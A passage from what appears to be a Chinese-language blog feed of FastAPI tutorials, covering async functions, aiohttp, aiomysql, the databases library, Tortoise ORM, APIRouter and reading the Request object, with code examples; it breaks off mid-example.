class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">results</span>():<br>    results = some_library()<br>    <span class="hljs-keyword">return</span> results<br></code></pre></td></tr></table></figure><ul><li>你需要使用的一个<strong>第三方库</strong>，需要使用 <code>await</code>调用时，此时使用 <code>async def</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">read_results</span>():<br>    results = <span class="hljs-keyword">await</span> some_library()<br>    <span class="hljs-keyword">return</span> results<br></code></pre></td></tr></table></figure><ul><li>你自己编写的工具库或者第三方工具库，代码执行过程中不涉及IO等待，此时直接调用即可，不用 <code>await</code></li><li>当你的函数内部只要有一处使用 <code>await</code>， 该函数必须使用 <code>async def </code>定义</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">read_results</span>():<br>    results1 = some_library1()<br>    results2 = <span class="hljs-keyword">await</span> some_library()<br>    <span class="hljs-keyword">return</span> results<br><span class="hljs-comment"># test</span><br></code></pre></td></tr></table></figure><ul><li><p>当你对协程&#x2F;async&#x2F;await&#x2F;asyncio这些概念不清楚的时候，就使用普通函数。</p></li><li><p>你需要使用的一个第三方库是同步库，但是你需要它支持协程异步，那需要自己使用线程池的方式运行，参考视频：</p><ul><li><a href="https://www.51zxw.net/Show.aspx?cid=1054&id=121502">线程池和协程混合实现并发案例</a></li></ul></li></ul><h1 id="12-4-fastapi集成aiohttp"><a href="#12-4-fastapi集成aiohttp" class="headerlink" title="12-4 fastapi集成aiohttp"></a>12-4 fastapi集成aiohttp</h1><p>传统python代码中发请求（如爬虫）我们一般使用requests模块，但是这个模块是同步阻塞的。</p><p>所以在异步asyncio体系中，我们不再使用requests模块，一般会使用异步的 <code>aiohttp</code> 模块。（httpx）</p><ul><li>使用前现在安装</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip3 install aiohttp<br></code></pre></td></tr></table></figure><ul><li>简介：<strong>异步支持客户端和服务端，功能强大</strong>。网址：<a href="https://docs.aiohttp.org/en/stable/">https://docs.aiohttp.org/en/stable/</a></li></ul><p>示例1：基本使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> aiohttp<br><br><span class="hljs-comment"># 协程函数</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">aiohttp_demo</span>():<br>    <span class="hljs-comment"># 获取一个连接session</span><br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> aiohttp.ClientSession() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-comment"># 基于连接发送一个get请求并获取像一个response</span><br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.get(<span class="hljs-string">&#x27;http://www.baidu.com&#x27;</span>) <span class="hljs-keyword">as</span> response:<br>            <span class="hljs-comment"># 从response中获取响应的各种结果</span><br>            <span class="hljs-comment"># 因为基于上下文管理器，所以出自动关闭连接</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Status:&quot;</span>, response.status)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Content-type:&quot;</span>, response.headers[<span class="hljs-string">&#x27;content-type&#x27;</span>])<br><br>            html = <span class="hljs-keyword">await</span> response.text()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Body:&quot;</span>, html[:<span class="hljs-number">15</span>], <span class="hljs-string">&quot;...&quot;</span>)<br><br>     <br><span class="hljs-comment"># 获取事件循环，在事件循环中执行协程函数</span><br><span class="hljs-comment"># loop = asyncio.get_event_loop()</span><br><span class="hljs-comment"># loop.run_until_complete(aiohttp_demo())</span><br><br><br><span class="hljs-comment"># 上面两行代码的简写，Python3.7以后的版本才可以使用</span><br>asyncio.run(aiohttp_demo())<br></code></pre></td></tr></table></figure><p>示例2：在fastapi中使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> aiohttp<br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><br><br>app = FastAPI(title=<span class="hljs-string">&quot;使用aiohttp&quot;</span>)<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">baidu_index</span>():<br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> aiohttp.ClientSession() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.get(<span class="hljs-string">&#x27;http://www.baidu.com&#x27;</span>) <span class="hljs-keyword">as</span> response:<br>            <span class="hljs-keyword">return</span> &#123;<br>                <span class="hljs-string">&quot;status&quot;</span>: response.status,<br>                <span class="hljs-string">&quot;content-type&quot;</span>: response.headers[<span class="hljs-string">&#x27;content-type&#x27;</span>],<br>                <span class="hljs-string">&quot;body&quot;</span>: <span class="hljs-keyword">await</span> response.text()<br>            &#125;<br></code></pre></td></tr></table></figure><ul><li>或者将爬取百度页面的代码封装成一个协程函数，在接口中直接调用该协程函数即可</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> aiohttp<br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><br><br>app = FastAPI(title=<span class="hljs-string">&quot;使用aiohttp&quot;</span>)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">baidu_html</span>():<br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> aiohttp.ClientSession() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.get(<span class="hljs-string">&#x27;http://www.baidu.com&#x27;</span>) <span class="hljs-keyword">as</span> response:<br>            <span class="hljs-keyword">return</span> &#123;<br>                <span class="hljs-string">&quot;status&quot;</span>: response.status,<br>                <span class="hljs-string">&quot;content-type&quot;</span>: response.headers[<span class="hljs-string">&#x27;content-type&#x27;</span>],<br>                <span class="hljs-string">&quot;body&quot;</span>: <span class="hljs-keyword">await</span> response.text()<br>            &#125;<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> baidu_html()<span class="hljs-comment"># 需要使用await 才能执行baidu_html 这个协程函数</span><br></code></pre></td></tr></table></figure><h1 id="12-5-fastapi集成aiomysql"><a href="#12-5-fastapi集成aiomysql" class="headerlink" title="12-5 fastapi集成aiomysql"></a>12-5 fastapi集成aiomysql</h1><p>在python中操作mysql我们通常使用pymysql作为数据库驱动，但是在异步的世界中我们使用aiomysql当驱动。</p><p>官网：<a href="https://aiomysql.readthedocs.io/en/latest/index.html">https://aiomysql.readthedocs.io/en/latest/index.html</a></p><p>示例1：aiomysql简单使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> aiomysql<br><span class="hljs-keyword">from</span> aiomysql.cursors <span class="hljs-keyword">import</span> DictCursor<br><br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><br>app = FastAPI(title=<span class="hljs-string">&quot;使用aiomysql&quot;</span>)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">aiomysql_demo</span>():<br>    <span class="hljs-comment"># 获取连接对象</span><br>    conn = <span class="hljs-keyword">await</span> aiomysql.connect(<br>        host=<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<br>        port=<span class="hljs-number">3306</span>,<br>        user=<span class="hljs-string">&quot;root&quot;</span>,<br>        password=<span class="hljs-string">&quot;12345&quot;</span>,<br>        db=<span class="hljs-string">&quot;db&quot;</span>,<br>        cursorclass=DictCursor      <span class="hljs-comment"># 返回字典格式的数据</span><br>    )<br>    <span class="hljs-comment"># 创建游标</span><br>    cur = <span class="hljs-keyword">await</span> conn.cursor()<br>    <span class="hljs-comment"># 执行SQL</span><br>    <span class="hljs-keyword">await</span> cur.execute(<span class="hljs-string">&quot;SELECT * from users;&quot;</span>)<br>    <span class="hljs-comment"># 获取SQL结果</span><br>    result = <span class="hljs-keyword">await</span> cur.fetchall()<br>    <span class="hljs-comment"># 关闭CURSOR</span><br>    <span class="hljs-keyword">await</span> cur.close()<br>    <span class="hljs-comment"># 关闭连接</span><br>    conn.close()<br><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> aiomysql_demo()<br><br></code></pre></td></tr></table></figure><h1 id="12-6-fastapi集成databases"><a href="#12-6-fastapi集成databases" class="headerlink" title="12-6 fastapi集成databases"></a>12-6 fastapi集成databases</h1><p>在异步世界中操作数据库，比如MySQL，我们需要只用 aiomysql，且需要自己手写SQL语句。</p><p>使用其他类型的数据库，比如PostgreSQL，则需要基于asyncpg或aiopg。</p><p>那样的就有一个问题，当我们的应用需要换一个数据库时，就需要调整基础代码，使用不灵活。</p><p>此时出现了一个工具，它封装了不同类型的数据库，我们只需要在使用它提供的接口操作数据库就行了，而不用关心底层的数据库驱动，它就是encode出品的 <code>databases</code>。</p><p><img src="/img/fastapi/image-20220731215718389.png" alt="image-20220731215718389"></p><p>官网简介</p><ul><li><p>Databases gives you simple asyncio support for a range of databases.</p></li><li><p>It allows you to make queries using the powerful <a href="https://docs.sqlalchemy.org/en/latest/core/">SQLAlchemy Core</a> expression language, and provides support for PostgreSQL, MySQL, and SQLite.</p></li><li><p>Databases is suitable for integrating against any async Web framework, such as <a href="https://github.com/encode/starlette">Starlette</a>, <a href="https://github.com/huge-success/sanic">Sanic</a>, <a href="https://github.com/kennethreitz/responder">Responder</a>, <a href="https://gitlab.com/pgjones/quart">Quart</a>, <a href="https://github.com/aio-libs/aiohttp">aiohttp</a>, <a href="https://github.com/tornadoweb/tornado">Tornado</a>, or <a href="https://github.com/tiangolo/fastapi">FastAPI</a>.</p></li><li><p><strong>Documentation</strong>: <a href="https://www.encode.io/databases/">https://www.encode.io/databases/</a></p></li><li><p><strong>Requirements</strong>: Python 3.7+</p></li><li><p>下载：<code> pip install databases</code></p></li></ul><p>示例：在fastapi中使用databases操作MySQL（依赖aiomysql）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><span class="hljs-keyword">from</span> databases <span class="hljs-keyword">import</span> Database<br><br>app = FastAPI(title=<span class="hljs-string">&quot;使用databases&quot;</span>)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">databases_demo</span>():<br>    <span class="hljs-comment"># 实例化一个db连接并建立连接</span><br>    database = Database(<span class="hljs-string">&#x27;mysql://root:12345@localhost:3306/db&#x27;</span>)<br>    <span class="hljs-keyword">await</span> database.connect()<br><br>    <span class="hljs-comment"># Run a database query.</span><br>    query = <span class="hljs-string">&quot;SELECT * FROM users&quot;</span><br>    rows = <span class="hljs-keyword">await</span> database.fetch_all(query=query)<br>    <span class="hljs-keyword">return</span> rows<br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> databases_demo()<br></code></pre></td></tr></table></figure><h1 id="12-7-fastapi集成乌龟ORM"><a href="#12-7-fastapi集成乌龟ORM" class="headerlink" title="12-7 fastapi集成乌龟ORM"></a>12-7 fastapi集成乌龟ORM</h1><p>想要使用ORM操作数据，使用了SQLAlchemy，</p><p>同样的在基于协程的异步代码中，操作数据库时也可以使用ORM，但此时就不能在使用SQLAlchemy（因为它不支持异步）</p><p>asyncio世界中，我们也有可以选择的ORM，比如： <a href="tortoise.github.io">tortoise-orm</a> 翻译过来就乌龟ORM</p><p>乌龟ORM简介</p><ul><li><p>官网：<a href="https://tortoise.github.io/">https://tortoise.github.io/</a></p></li><li><p>Tortoise ORM is an easy-to-use <code>asyncio</code> ORM <em>(Object Relational Mapper)</em> inspired by Django.</p></li><li><p>Tortoise ORM was build with relations in mind and admiration for the excellent and popular Django ORM.</p></li><li><p>Tortoise ORM is supported on CPython &gt;&#x3D; 3.7 for SQLite, MySQL and PostgreSQL.</p></li><li><p>下载安装：<code>pip3 install tortoise-orm</code></p></li></ul><p>示例：fastapi简单集成乌龟ORM</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># main.py</span><br><br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><span class="hljs-keyword">from</span> tortoise <span class="hljs-keyword">import</span> fields<br><span class="hljs-keyword">from</span> tortoise.models <span class="hljs-keyword">import</span> Model<br><span class="hljs-keyword">from</span> tortoise.contrib.fastapi <span class="hljs-keyword">import</span> register_tortoise<br><br>app = FastAPI(title=<span class="hljs-string">&quot;使用tortoise orm&quot;</span>)<br><br><span class="hljs-comment"># 定义模型表</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">Model</span>):<br>    <span class="hljs-built_in">id</span> = fields.IntField(pk=<span class="hljs-literal">True</span>)<br>    username = fields.CharField(max_length=<span class="hljs-number">255</span>)<br>    password = fields.CharField(max_length=<span class="hljs-number">255</span>)<br>    email = fields.CharField(max_length=<span class="hljs-number">255</span>)<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Meta</span>:<br>        table = <span class="hljs-string">&quot;users&quot;</span><span class="hljs-comment"># 表示这个表对应数据库中的表名</span><br><br><span class="hljs-comment"># 使用register_tortoise 注册数据库信息</span><br>register_tortoise(<br>    app,<br>    db_url=<span class="hljs-string">&quot;mysql://root:12345@127.0.0.1:3306/db&quot;</span>,<br>    modules=&#123;<span class="hljs-string">&quot;models&quot;</span>: [<span class="hljs-string">&quot;main&quot;</span>]&#125;,<span class="hljs-comment"># 指定模型表所在的文本，&quot;main&quot; 表示mian.py中定义了User模型表</span><br>)<br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    user = <span class="hljs-keyword">await</span> User.<span class="hljs-built_in">filter</span>(username=<span class="hljs-string">&quot;liuxu&quot;</span>).first()<br>    user.email = <span class="hljs-string">&quot;1111&quot;</span><br>    <span class="hljs-keyword">await</span> user.save()<br><br>    <span class="hljs-comment"># 常用的CRUD方法</span><br>    <span class="hljs-comment"># fake_user = await User.create(username=&quot;111&quot;, password=&quot;111&quot;, email=&quot;111&quot;)</span><br>    <span class="hljs-comment"># await User.filter(id=fake_user.id).update(username=&quot;Updated name&quot;)</span><br>    <span class="hljs-comment"># await User.filter(id=1).delete()</span><br><br>    <span class="hljs-keyword">return</span> user<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>编程，web开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】FastAPI7之APIRouter与请求响应的进阶用法（七）</title>
    <link href="/2024/03/04/687FastAPI7%E4%B9%8BAPIRouter%E4%B8%8E%E8%AF%B7%E6%B1%82%E5%93%8D%E5%BA%94%E7%9A%84%E8%BF%9B%E9%98%B6%E7%94%A8%E6%B3%95/"/>
    <url>/2024/03/04/687FastAPI7%E4%B9%8BAPIRouter%E4%B8%8E%E8%AF%B7%E6%B1%82%E5%93%8D%E5%BA%94%E7%9A%84%E8%BF%9B%E9%98%B6%E7%94%A8%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="10-1-APIRouter基本使用【重点】"><a href="#10-1-APIRouter基本使用【重点】" class="headerlink" title="10-1 APIRouter基本使用【重点】"></a>10-1 APIRouter基本使用【重点】</h1><p><strong>场景：</strong></p><p>如果我们写一个网站，或者写一个APP，那整个项目是<strong>比较复杂</strong>的，此时不应该把所有代码放在一个文件中。</p><p>前面我们通过把代码拆分到不同文件的方式，可以解决一些代码混乱的问题，但是却不能更好的解决。</p><p>比如一个项目中可能含有不同的模块，那不同的模块应该分开管理，这样项目才便于维护和管理。。</p><p><strong>FastAPI的解决方式</strong></p><p>APIRouter就是FastAPI为了此需求场景提供了一种解决方式，它类似 <strong>Flask中的蓝图</strong>，<strong>Django中的app</strong></p><p>示例1：APIRouter的基本使用</p><ul><li>main.py 非常简洁，主要负责注册管理</li><li>使用 <code>app.include_router(blog.router, prefix=&quot;/blog&quot;, tags=[&quot;Blog&quot;])</code> 注册模块，同时可以指定及api的前缀(prefix)和标签(tags)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><span class="hljs-keyword">from</span> routers <span class="hljs-keyword">import</span> blog, user<br><br>app = FastAPI()<br>app.include_router(blog.router, prefix=<span class="hljs-string">&quot;/blog&quot;</span>, tags=[<span class="hljs-string">&quot;Blog&quot;</span>])<br>app.include_router(user.router)<br></code></pre></td></tr></table></figure><ul><li>routers&#x2F;blog.py 主要负责和blog模块有关的业务</li><li><code>router = APIRouter()</code>得到的 router对象和main.py中的app对象使用方式一样</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> APIRouter<br>router = APIRouter()<br><br><span class="hljs-meta">@router.get(<span class="hljs-params"><span class="hljs-string">&quot;/blogs&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">blogs</span>():<br>    <span class="hljs-keyword">return</span> [&#123;<span class="hljs-string">&quot;id&quot;</span>: i, <span class="hljs-string">&quot;title&quot;</span>: <span class="hljs-string">f&quot;blog<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>&#125; <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)]<br><br><span class="hljs-meta">@router.get(<span class="hljs-params"><span class="hljs-string">&quot;/&#123;blog_id&#125;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_blog</span>(<span class="hljs-params">blog_id: <span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;id&quot;</span>: blog_id, <span class="hljs-string">&quot;title&quot;</span>: <span class="hljs-string">f&quot;blog<span class="hljs-subst">&#123;blog_id&#125;</span>&quot;</span>&#125;<br><br><span class="hljs-meta">@router.delete(<span class="hljs-params"><span class="hljs-string">&quot;/&#123;blog_id&#125;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">blog_id: <span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">f&quot;Done blog_id: <span class="hljs-subst">&#123;blog_id&#125;</span>&quot;</span>&#125;<br></code></pre></td></tr></table></figure><ul><li>routers&#x2F;user.py，负责和用户相关的模块</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> APIRouter, Form<br>router = APIRouter(tags=[<span class="hljs-string">&quot;User&quot;</span>], prefix=<span class="hljs-string">&quot;/user&quot;</span>)<br><br><span class="hljs-meta">@router.post(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">name: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>), pwd: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>)</span>):<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;name&quot;</span>: name&#125;<br><br><br><span class="hljs-meta">@router.get(<span class="hljs-params"><span class="hljs-string">&quot;/me&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>():<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;info&quot;</span>:  <span class="hljs-string">&quot;this is a cute boy&quot;</span>&#125;<br></code></pre></td></tr></table></figure><ul><li>目的：</li></ul><p>让所有的API文件指向一个同一个实例化的FastAPI()对象 也就是同一个app对象</p><h1 id="11-1-直接使用Request对象"><a href="#11-1-直接使用Request对象" class="headerlink" title="11-1 直接使用Request对象"></a>11-1 直接使用Request对象</h1><ul><li><p>关于请求的操作，比如从URL中提取路径参数，获取查询参数，获取请求头，获取Cookie，获取请求体中的数据；这些参数和值的获取非常方便，这是因为FastAPI帮我们创造便利。</p></li><li><p>FastAPI底层依赖Starlette，本质上是FastAPI帮我们做了一些操作，从Starlette的Request对象解析出上述各个参数。</p></li><li><p>所以，对于上面这些常用的请求参数，我们可以直接使用FastAPI给我们提供的工具，并且有了数据校验、类型转化、OPenAPI文档等功能。</p></li><li><p>当然了，你不使用FastAPI提供的便捷工具，直接从Request对象中解析数据也是可以的，但就没由数据校验、类型转化、OPenAPI文档等功能。</p></li><li><p>不过，有些场景，比如说获取请求的IP，请求的client host等等，那我们就必须直接使用Request对象。</p></li></ul><p>示例1：使用使用Request获取一些常见参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Request<br><span class="hljs-keyword">from</span> starlette.requests <span class="hljs-keyword">import</span> Request<br>app = FastAPI()<br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&#123;item_id&#125;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>(<span class="hljs-params">req: Request</span>):<br>    item_id = req.path_params.get(<span class="hljs-string">&quot;item_id&quot;</span>) <span class="hljs-comment"># 从请求的路径参数获取item_id</span><br>    page = req.query_params.get(<span class="hljs-string">&quot;page&quot;</span>, <span class="hljs-number">0</span>) <span class="hljs-comment"># 从请求的查询参数获取分页信息</span><br>    size = req.query_params.get(<span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">10</span>)<br>    x_token = req.headers.get(<span class="hljs-string">&quot;x-token&quot;</span>) <span class="hljs-comment"># 从 请求头从获取x-token</span><br>    x_token_cookie = req.cookies.get(<span class="hljs-string">&quot;x_token&quot;</span>) <span class="hljs-comment"># 从 请求的cookies从获取x-token</span><br><br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&quot;item_id&quot;</span>: item_id,<br>        <span class="hljs-string">&quot;page&quot;</span>: page,<br>        <span class="hljs-string">&quot;size&quot;</span>: size,<br>        <span class="hljs-string">&quot;x-token&quot;</span>: x_token,<br>        <span class="hljs-string">&quot;cookie&quot;</span>: x_token_cookie,<br><br>    &#125;<br></code></pre></td></tr></table></figure><p>示例2：使用Request获取客户端host</p><ul><li>从fastapi导入 <code>Request</code>对象，或者直接从 starlette.requests导入 <code>Request</code>， 两者是一样的效果。</li><li>本例中，路径参数 <code>item_id</code>是用的FastAPI提供的便捷方式，所以具有类型转换、类型校验、openapi文档等附加功能。</li><li>第二个形参 <code>req</code> 的类型是 <code>Request</code>，那FastAPI就知道要直接从Request中获取参数，就没有上述附加功能。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 